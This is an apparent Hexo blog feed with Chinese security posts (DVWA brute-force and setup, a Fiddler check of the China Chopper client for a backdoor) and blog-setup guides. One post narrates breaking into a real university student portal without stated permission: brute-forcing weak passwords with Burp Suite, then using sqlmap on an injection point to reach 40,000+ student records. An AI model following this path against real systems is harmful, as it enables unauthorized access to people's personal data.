暴力破解虽然没什么技术含量，且大多数时候比较耗时，然而，越是如此，越容易被忽略，在渗透测试当中常也能有意外收获。站点后台暴力破解的难度一般较大，且斩获较少，而对于用户系统来说，大量的用户总有那么些懒惰的人存在，喜欢简单易记的用户名密码，而这些都是暴力破解的突破口，当然，实际操作中还要结合其他资源。&lt;br&gt;　　暴力破解其实最主要的就是字典，一个好的字典，能让你节省大量时间，快速破解用户名密码。而一本好的字典不是随便网上搜出来的，而是经验的积累。最好就是有一本不是太大的常见用户名和密码字典，可以进行初步的测试，然后结合搜集到的站点的各种信息，制作一本针对性更强的字典来使用，这样既可以节省时间，又可以更加准确的破解账户密码。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文通过DVWA的Brute Force模块进行暴力破解漏洞的一般演示，其中还使用了burpsuite工具。
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>5.渗透测试平台DVWA之简单介绍</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0DVWA%E4%B9%8B%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/"/>
    <id>http://yoursite.com/渗透测试平台DVWA之简单介绍/</id>
    <published>2016-04-18T03:39:28.000Z</published>
    <updated>2016-06-10T11:42:41.265Z</updated>
    
    <content type="html">&lt;p&gt;　　本文简单介绍了渗透测试平台DVWA的下载安装，以及平台上的基本功能。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;下载安装DVWA&quot;&gt;&lt;a href=&quot;#下载安装DVWA&quot; class=&quot;headerlink&quot; title=&quot;下载安装DVWA&quot;&gt;&lt;/a&gt;下载安装DVWA&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.dvwa.co.uk/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;DVWA下载入口&lt;/a&gt;&lt;br&gt;　　DVWA是使用PHP语言写的测试平台，以及使用的MySql数据库，所以要先搭好PHP+MYSQL的环境。&lt;br&gt;　　下载完成后，把文件直接解压到你的站点根目录就可以了！&lt;br&gt;　　接下来就要修改配置文件，即config文件夹中的config.ini.php&lt;br&gt;　　根据你的数据库实际情况进行数据库地址，用户名和密码修改。&lt;br&gt;　　最后访问&lt;a href=&quot;http://你的DVWA地址/setup.php安装即可。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://你的DVWA地址/setup.php安装即可。&lt;/a&gt;&lt;br&gt;　　安装完成后，DVWA有五个默认用户，分别为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;admin/password&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;gordonb/abc123&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1337/charley&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pablo/letmein&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;smithy/password&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　登录进入系统后，界面如图：&lt;br&gt;&lt;img src=&quot;/uploads/5/5-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;DVWA功能模块说明&quot;&gt;&lt;a href=&quot;#DVWA功能模块说明&quot; class=&quot;headerlink&quot; title=&quot;DVWA功能模块说明&quot;&gt;&lt;/a&gt;DVWA功能模块说明&lt;/h2&gt;&lt;p&gt;（一）setup&lt;br&gt;　　该模块中可以对数据库进行安装和重置&lt;br&gt;&lt;img src=&quot;/uploads/5/5-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;（二）十大测试功能模块&lt;br&gt;　　DVWA共有十大测试模块，即Brute Force模块开始到XSS stored模块。依次为暴力破解，命令执行，跨站请求伪造，不安全的验证码，文件包含，SQL注入，SQL盲注，文件上传，反射型XSS，存储型XSS。&lt;br&gt;　　需要注意的是不安全的验证码模块需要额外的配置。（这里不做介绍，要翻墙）&lt;br&gt;&lt;img src=&quot;/uploads/5/5-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;（三）DVWA安全level&lt;br&gt;　　DVWA拥有三个安全level，分别为low，medium和high。&lt;br&gt;　　不同level的DVWA，其安全性不一样，在一些功能模块中的测试难度也会不一样，如命令执行，SQL注入等。&lt;br&gt;　　能够让大家由简入深的学习各项漏洞利用技巧，体验不同难度的渗透技术。&lt;br&gt;　　在网页左下角可以看到登录用户名，level等级以及是否开启了PHPIDS。&lt;br&gt;&lt;img src=&quot;/uploads/5/5-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文简单介绍了渗透测试平台DVWA的下载安装，以及平台上的基本功能。
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>4.中国菜刀爆菊记之我的检测之旅</title>
    <link href="http://yoursite.com/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E7%88%86%E8%8F%8A%E8%AE%B0%E4%B9%8B%E6%88%91%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B9%8B%E6%97%85/"/>
    <id>http://yoursite.com/中国菜刀爆菊记之我的检测之旅/</id>
    <published>2016-04-02T14:30:20.000Z</published>
    <updated>2016-04-20T09:53:56.692Z</updated>
    
    <content type="html">&lt;p&gt;　　前几天爆起的菜刀后门事件可谓在安全界里面掀起龙卷风，三百万Webshell就这么成了别人的嫁衣，吾心甚恐。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://drops.wooyun.org/news/13471&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;事件传送门&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/uploads/4/4-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　事件之后，白帽子们纷纷紧张的测试自己的菜刀有没有后门，多年的心血是否被窃取。&lt;br&gt;　　其实，在此之前，就曾经爆出过菜刀存在后门的情况了，只是当时并没有爆出如此巨大的Webshell被爆菊，也并没有引起这么大的震动，如今，亮闪闪的数字以及清晰的分析告诉你，菜刀后门是如此的可恶，竟然窃取了那么多白帽子们的辛苦成果，实在是可恶至极。&lt;br&gt;　　作为小白，虽然没有手握大量Webshell，但总也有那么些再手上呀，我也不得不担心自己的成果被人爆菊了，这可不能忍，于是乎开启了我的检测之旅。&lt;br&gt;　　我采取抓包检测，使用的抓包工具是fiddler。&lt;br&gt;　　首先需要一个测试站点，我在虚拟机里搭了个2003的服务器，放了个一句话木马，用来给我的菜刀连接。&lt;br&gt;　　打开fiddler开始抓包，因为还没有访问，所以没有任何数据包&lt;br&gt;&lt;img src=&quot;/uploads/4/4-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　打开菜刀，看看fiddler有没反应，嗯，依然正常没有数据包（为什么打开菜刀要查看有没数据包，因为有道友说有的菜刀在打开的时候就会发送莫名其妙的数据包，所以我要谨慎）&lt;br&gt;　　接着用菜刀连接我们的服务器上的一句话&lt;br&gt;&lt;img src=&quot;/uploads/4/4-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　可以看到，有两个数据包，我们分别来检测下看传输了些什么数据，有没有问题。&lt;br&gt;　　首先第一个数据包&lt;br&gt;&lt;img src=&quot;/uploads/4/4-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从内容中可以看到一部分做了UTF-8编码，一部分是16进制码，那么我们就解码看看。&lt;br&gt;&lt;img src=&quot;/uploads/4/4-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　UTF-8部分解码后，看起来没有问题，是熟悉的菜刀代码&lt;br&gt;&lt;img src=&quot;/uploads/4/4-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　16进制部分也没有问题&lt;br&gt;　　我们再看回数据包的Header头&lt;br&gt;&lt;img src=&quot;/uploads/4/4-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　也并没有奇怪的数据提交申请和IP，那么第一个数据包就检测完成了，初步结果没有问题，第二个数据包检测与第一个一样，接不上步骤了。&lt;br&gt;　　至于第二个数据包为什么比较大，是因为16进制部分的内容不同，第一个数据包是请求与目标连接，第二个是请求文件管理，所以第二个数据包要比较大，下面是第二个数据包的16进制部分解码。&lt;br&gt;&lt;img src=&quot;/uploads/4/4-8.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　本次检测就到此为止，没有发现可疑后门，总算是心里松了口气。在这里也祝愿各位同道的菜刀也没有后门哈。&lt;br&gt;　　PS：如对本次检测有任何疑问，欢迎留言评论指正！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　前几天爆起的菜刀后门事件可谓在安全界里面掀起龙卷风，三百万Webshell就这么成了别人的嫁衣，吾心甚恐。
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>3.一次诈骗电话事件引发的对母校学生信息安全的深思</title>
    <link href="http://yoursite.com/%E4%B8%80%E6%AC%A1%E8%AF%88%E9%AA%97%E7%94%B5%E8%AF%9D%E4%BA%8B%E4%BB%B6%E5%BC%95%E5%8F%91%E7%9A%84%E5%AF%B9%E6%AF%8D%E6%A0%A1%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%9A%84%E6%B7%B1%E6%80%9D/"/>
    <id>http://yoursite.com/一次诈骗电话事件引发的对母校学生信息安全的深思/</id>
    <published>2016-03-15T09:36:00.000Z</published>
    <updated>2017-05-13T04:49:13.017Z</updated>
    
    <content type="html">&lt;p&gt;　　考虑了好久，还是整理写了这篇文章哈！谨以此文告诫在校生加强自我安全意识，同时提醒校方加强学生信息安全的管理力度，以及对校园网络安全的重视。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;　　年前的时候，临近放假，据说学校不少师生接到诈骗电话，而且大多是年级较低的同学，算是比较有针对性的诈骗了。&lt;br&gt;　　由于工作的性质，如今对信息安全都比较敏感，当时就想了，貌似每年都有这情况，而且不止母校的样子。&lt;br&gt;　　那么，学校网络被人捅了？师生信息泄露？于是就想着如何模拟陌生人对母校进行渗透，窃取师生信息。&lt;br&gt;　　下面开始模拟渗透过程：&lt;br&gt;　　首先，百度母校官网，直接访问&lt;br&gt;&lt;img src=&quot;/uploads/3/3-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　嗯，简单查看各个功能，子站，右上角可以发现有个学生系统入口，这个一看就是有学生数据的系统，直接访问看看能外网访问不&lt;br&gt;&lt;img src=&quot;/uploads/3/3-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　啧啧啧，看到的第一眼就是，没有验证码，可以考虑爆破，不过不知道数据传输有没有加密，密码错误次数什么的有没有限制。&lt;br&gt;　　经过测试，啧啧啧，数据明文，错误次数无限制，同IP高并发访问也没有限制，可以直接暴力破解个天昏地暗啊！&lt;br&gt;　　这里直接测试弱口令！不过在此之前，我们要搞到学号组成&lt;br&gt;　　什么地方能够提供这些基础信息？古代客栈是信息集中地，可以收集各种信息，那么在现在的网络社会呢？当然是各种社交网站，论坛等等，当然也可以直接通过Google关键字搜索技术进行搜集，这里我通过BBS搜集。&lt;br&gt;　　现在基本高校都有自己的BBS，百度一搜学校名+BBS，母校的BBS就出来了，我们直接进入进行吧内搜索，关键字学号。（也可以直接查看那些新生贴进行搜集）&lt;br&gt;&lt;img src=&quot;/uploads/3/3-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　啧啧啧，学号什么的就有例子了，搜集多个学号进行比对，然后猜测一下组成。&lt;br&gt;　　直接假设后三位或四位是编号之类的，那么我们对后四位进行遍历，来测试弱口令看看效果如何。&lt;br&gt;　　回到myscse登录界面，启动我们的burpsuite神器进行抓包，暴力破解，测试弱口令123456&lt;br&gt;　　不一会，效果出来了，数据包长度325的就是正确的&lt;br&gt;&lt;img src=&quot;/uploads/3/3-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　现在利用得到的任一弱口令账号登录进去看看，嗯，有个信息管理系统，那就是还要进去咯，毕竟我们的目标是师生信息！&lt;br&gt;&lt;img src=&quot;/uploads/3/3-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　同样需要学号密码登录，一般的第一反应都是会测试刚刚的账号密码是否可行，结果可想而知。&lt;br&gt;　　然后就可以查看各种个人信息了，啧啧啧！&lt;br&gt;&lt;img src=&quot;/uploads/3/3-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　不过没有联系电话住址呀这些更敏感的信息呀，看来要试试有没接口暴露信息或者注入了。（这里暂不考虑拿shell）&lt;br&gt;　　经测试，全校课程信息处有个注入点！这个注入点也是让我有点醉，只是做了简单的前端验证用户输入，可惜然并卵。&lt;br&gt;　　直接burpsuite抓包绕过前端验证，数据包扔sqlmap里开跑，等一会就有直接结果了,直接查学生表&lt;br&gt;&lt;img src=&quot;/uploads/3/3-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　啧啧啧，40000+学生档案数据，其他表还包括大量其他敏感数据，包括成绩，考试信息，毕业生工作信息等等，想怎么查就怎么查，脱裤就有点慢，不过可以自己写个针对性强些脚本来脱裤，优化一下哈，这里仅检测，就不深入了。&lt;br&gt;　　总结：&lt;br&gt;　　1、高校学生网络安全意识过于薄弱&lt;br&gt;　　2、校方对于校园网络安全管理力度不足，不够重视&lt;br&gt;　　3、校方对于学生网络安全意识的教育不足&lt;br&gt;PS：校方老师，领导如有修复问题，可联系本人咨询！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　考虑了好久，还是整理写了这篇文章哈！谨以此文告诫在校生加强自我安全意识，同时提醒校方加强学生信息安全的管理力度，以及对校园网络安全的重视。&lt;br&gt;
    
    </summary>
    
      <category term="渗透事件" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E4%BA%8B%E4%BB%B6/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>2.Hexo配置与使用</title>
    <link href="http://yoursite.com/Hexo%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/Hexo配置与使用/</id>
    <published>2016-03-07T06:18:59.000Z</published>
    <updated>2016-04-20T02:57:24.351Z</updated>
    
    <content type="html">&lt;p&gt;　　本文主要介绍Hexo的一些基本站点配置，主题的选择和使用，以及文章的撰写发表！&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;域名绑定&quot;&gt;&lt;a href=&quot;#域名绑定&quot; class=&quot;headerlink&quot; title=&quot;域名绑定&quot;&gt;&lt;/a&gt;域名绑定&lt;/h2&gt;&lt;p&gt;　　首先我们的博客域名angoddess.github.io是访问正常的，但是我们可能觉得这个域名太丑了，简直弱爆了。我们想如果有人访问angoddess.github.io时指向别的域名，但还是正常访问我们的博客，这就是我们常说的重定向，操作很简单，首先我们要申请个自己的域名。&lt;br&gt;　　我是在阿里云申请的域名：www.angoddess.cn，地址是：&lt;a href=&quot;http://wanwang.aliyun.com/domain/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://wanwang.aliyun.com/domain/&lt;/a&gt;&lt;br&gt;　　申请好域名之后，我们要配置让这个域名能够解析到我们的GitHub博客的地址，也就是访问www.angoddess.cn会访问到我们的博客内容。&lt;br&gt;　　我们来到阿里云的管理控制台，域名，找到我们的域名，选择解析&lt;br&gt;&lt;img src=&quot;/uploads/2/2-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　我们添加一条CNAME记录，把域名解析到我们博客的位置，如图：&lt;br&gt;&lt;img src=&quot;/uploads/2/2-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　启用后，我们访问www.angoddess.cn就可以访问到我们的博客了&lt;br&gt;　　PS：可能启用后，马上访问还是没效果，不要急，等待几分钟，或者直接清理浏览器的缓存再访问试试。&lt;br&gt;　　如果想访问angoddess.cn也访问到我们的博客，那么就再添加一条CNAME记录，主机记录那里改为@，其它不变就可以了。&lt;br&gt;　　但是，我们会发现我们访问angoddess.github.io域名时，域名依然没有变。因为我们只是让www.angoddess.cn有内容了而已，还没有让博客域名重定向到这个域名。&lt;br&gt;　　别急，接下来我们就来重定向博客域名，步骤很简单，一步解决。&lt;br&gt;　　我们只需要在Hexo下的source目录中，添加一个文件名为CNAME的文件，然后内容就是你的域名即可，如图：&lt;br&gt;&lt;img src=&quot;/uploads/2/2-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　最后更新代码到你的GitHub上。&lt;br&gt;　　这时我们访问原来的博客地址就会重定向到我们在阿里云申请的域名啦，而且访问正常！是不是很酷！&lt;br&gt;　　PS：如果没有马上生效，记得不要急，等几分钟或清理缓存。&lt;/p&gt;
&lt;h2 id=&quot;主题使用与配置&quot;&gt;&lt;a href=&quot;#主题使用与配置&quot; class=&quot;headerlink&quot; title=&quot;主题使用与配置&quot;&gt;&lt;/a&gt;主题使用与配置&lt;/h2&gt;&lt;p&gt;Hexo的默认主题是landscape，其实也还蛮不错的啦，如果不喜欢，我们在GitHub上可以找到很多其他的主题，这里介绍一款较受欢迎的主题next，GitHub地址：&lt;a href=&quot;https://github.com/iissnan/hexo-theme-next&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/iissnan/hexo-theme-next&lt;/a&gt;&lt;br&gt;可以在GitHub上面直接下载zip文件，然后解压到我们自己的Hexo根目录下的themes下（themes就是存放我们的主题的文件夹，主题名就是文件夹名），命名为next。&lt;br&gt;当然我们可以直接用git克隆。进入到我们的Hexo目录下的themes文件夹中，调用git，执行克隆命令&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$git clone https://github.com/iissnan/hexo-theme-next next&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;执行完命令，我们就可以看到themes目录下多了next主题文件夹了。&lt;br&gt;安装主题就更加简单了，我们只需要在Hexo根目录下的_config.yml中，更改theme的值为我们想要的主题的目录名称即可，如图：&lt;br&gt;&lt;img src=&quot;/uploads/2/2-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;之后，我们启动本地服务测试，查看效果&lt;br&gt;在Hexo根目录启动git Bash（git shell）&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/2/2-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　安装完主题，我们发现其实并没有达到我们想要的界面效果或功能，别急，我们还要对主题进行配置。&lt;br&gt;　　NexT主题有很多配置项，包括导航菜单，个人头像，文章评论功能等等，官方有非常详细的介绍，这里就不一一叙述了。&lt;br&gt;　　&lt;a href=&quot;http://theme-next.iissnan.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://theme-next.iissnan.com/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;文章的撰写&quot;&gt;&lt;a href=&quot;#文章的撰写&quot; class=&quot;headerlink&quot; title=&quot;文章的撰写&quot;&gt;&lt;/a&gt;文章的撰写&lt;/h2&gt;&lt;p&gt;　　首先我们要创建文章页面&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$hexo new &amp;quot;这里是文章标题&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　然后在根目录下source目录中的_posts目录下，就可以看到我们创建的文章页面，后缀是.md，点开就可以开始编写文章了。&lt;br&gt;　　可以给文章设置标题，标签，题目等信息。&lt;br&gt;如果多标签，格式如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tags: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	- Hexo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	- Blog&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	- NexT&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　Hexo是通过Markdown语言写文章的，就是在我们平时写代码的编辑器里去写。。。&lt;br&gt;　　这逼装得是那个牛啊，不过就是对于用惯了富文本编辑器写文章的人来说，可能有点麻烦&lt;br&gt;　　Markdown语法其实也相对比较简单，很容易上手。&lt;br&gt;　　可以参考&lt;a href=&quot;http://sspai.com/25137&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://sspai.com/25137&lt;/a&gt;&lt;br&gt;　　网上有一些Markdown编辑器可以辅助编辑文章，如：&lt;br&gt;　　&lt;a href=&quot;http://mahua.jser.me/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://mahua.jser.me/&lt;/a&gt;&lt;br&gt;　　还是很不错的，这里附上一张我的文章编辑界面哈，用的是Sublime Text 3，对这个代码编辑器情有独钟。&lt;br&gt;&lt;img src=&quot;/uploads/2/2-7.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　至于文章的发表，这个上一章已经说过了，这里就不重复了哈！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文主要介绍Hexo的一些基本站点配置，主题的选择和使用，以及文章的撰写发表！&lt;br&gt;
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="network" scheme="http://yoursite.com/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>1.Build Your Blog By Github</title>
    <link href="http://yoursite.com/Build-Your-Blog-By-Github/"/>
    <id>http://yoursite.com/Build-Your-Blog-By-Github/</id>
    <published>2016-03-01T02:52:39.000Z</published>
    <updated>2016-04-20T02:34:56.369Z</updated>
    
    <content type="html">&lt;p&gt;Here I will teach you how to bulid your personal blog by github.&lt;br&gt;Tools: git | github | hexo&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;code&gt;My System:window 7 64bit&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;Frist-Register-your-github-user&quot;&gt;&lt;a href=&quot;#Frist-Register-your-github-user&quot; class=&quot;headerlink&quot; title=&quot;Frist: Register your github user.&quot;&gt;&lt;/a&gt;Frist: Register your github user.&lt;/h2&gt;&lt;p&gt;Input your email and password,then follow the tips to do.Just so easy!&lt;br&gt;&lt;img src=&quot;/uploads/1/1-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Second-Build-a-new-repository-for-your-blog&quot;&gt;&lt;a href=&quot;#Second-Build-a-new-repository-for-your-blog&quot; class=&quot;headerlink&quot; title=&quot;Second: Build a new repository for your blog.&quot;&gt;&lt;/a&gt;Second: Build a new repository for your blog.&lt;/h2&gt;&lt;p&gt;Login your github and build a new repository on the right top.&lt;br&gt;&lt;img src=&quot;/uploads/1/1-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;Input the information about of your blog.&lt;br&gt;&lt;img src=&quot;/uploads/1/1-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;then,click the button “Create repository” to create your repository.&lt;br&gt;Now,select the Setting tab and click the button “Launch automatic page generator” to design your blog page.&lt;br&gt;&lt;img src=&quot;/uploads/1/1-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;Here you can design your blog index page.&lt;br&gt;&lt;img src=&quot;/uploads/1/1-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;Select the style you love for your blog page.&lt;br&gt;&lt;img src=&quot;/uploads/1/1-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;Finally,pulish your page to finish your blog page.&lt;br&gt;Now,you already have a blog by yourself.&lt;br&gt;You can visit by &lt;a href=&quot;http://username.github.io(e.g.http://angoddess.github.io&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://username.github.io(e.g.http://angoddess.github.io&lt;/a&gt;).&lt;/p&gt;
&lt;h2 id=&quot;Third-Install-the-git-and-connect-to-your-github&quot;&gt;&lt;a href=&quot;#Third-Install-the-git-and-connect-to-your-github&quot; class=&quot;headerlink&quot; title=&quot;Third: Install the git and connect to your github.&quot;&gt;&lt;/a&gt;Third: Install the git and connect to your github.&lt;/h2&gt;&lt;p&gt;Install the git is too easy so I will not teach it. Git Download&lt;br&gt;Now we make the git to connect your github by ssh.&lt;br&gt;Open your git bash(git shell).&lt;br&gt;Set your username and email:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$git config --global user.name &amp;quot;angoddess&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$git config --global user.email &amp;quot;447375410@qq.com&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
